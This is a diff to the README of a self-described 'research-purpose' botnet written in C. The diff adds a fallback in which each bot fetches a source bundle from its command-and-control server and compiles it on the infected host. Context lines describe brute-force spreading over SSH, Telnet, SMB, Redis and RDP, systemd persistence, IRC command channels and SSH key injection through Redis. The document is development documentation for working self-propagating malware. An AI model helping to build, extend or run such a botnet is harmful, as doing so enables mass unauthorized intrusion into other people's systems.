@@ -9,8 +9,8 @@ A research-purpose botnet written in pure C, designed to replicate across hetero
 - **Multi-vector spreading**: SSH, Telnet, SMB, Redis, RDP
 - **Peer-to-peer daisychain**: (planned, not yet implemented) — peer DNS
   discovery exists, but no peer relay or C2 fallback through peers yet
-- **On-target compilation**: (planned, not yet implemented) — `payload_compile()`
-  exists but no embedded source tarball is shipped; updates are download-only
+- **On-target compilation**: supported as an update fallback — the bot can
+  fetch a verified source bundle and compile locally (see Payload Delivery)
 - **Modern + classic**: systemd persistence, IRC command channels, and brute-force spreading
 
 ## Architectures
@@ -59,7 +59,17 @@ placeholder is rejected.
 1. Direct binary download from C2 (preferred), verified by a SHA-256 pin
    (`payload_sha256=` config / `NOTNET_PAYLOAD_SHA256` env). Update is refused
    without a pin or on hash mismatch (fail-closed).
-2. On-target compilation from embedded source tarball (planned, not yet implemented)
+2. On-target compilation (fallback, when binary download fails or the binary
+   pin mismatches):
+   - The bot fetches the source bundle from the C2 (`payload_source_url=`,
+     default `http://<http_server>:<http_port>/notnet-src.tar`).
+   - The tarball must match `payload_source_sha256=` (config /
+     `NOTNET_PAYLOAD_SOURCE_SHA256` env) — fail-closed, same as the binary.
+   - The tarball is extracted safely (path traversal rejected), compiled with
+     the first available compiler (gcc/cc/musl-gcc/clang), static link first,
+     dynamic fallback, under a 120s timeout.
+   - Produce the bundle with `make dist-src` (prints the pin to set).
+   - Enabled with `payload_compile_enabled=1`.
 
 ## Commands
 
@@ -104,6 +114,9 @@ The bot loads config from `/etc/notnet.conf` (key=value format):
 || `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
 || `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
 || `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
+|| `payload_compile_enabled` | `0` | 0/1 — allow on-target compilation fallback |
+|| `payload_source_url` | auto | URL of the source bundle (default `http://<server>:<port>/notnet-src.tar`) (or `NOTNET_PAYLOAD_SOURCE_URL` env var) |
+|| `payload_source_sha256` | *(none)* | Expected SHA-256 of the source bundle; compile refused without a match (or `NOTNET_PAYLOAD_SOURCE_SHA256` env var) |
 || `redis_ssh_key` | *(none)* | SSH public key injected into Redis authorized_keys (or `NOTNET_REDIS_SSH_KEY` env var) |
 || `scan_interval` | `30` | Seconds between scan cycles |
 || `heartbeat_interval` | `60` | Seconds between heartbeats |
@@ -170,6 +183,7 @@ shell interpolation.
 make            # static x86_64 build, cleartext C2
 make TLS=1      # dynamic build with OpenSSL TLS support
 make build-armv7l / build-aarch64 / build-riscv64   # cross builds
+make dist-src   # build the on-target compilation source bundle + pin
 make clean
 ```
 
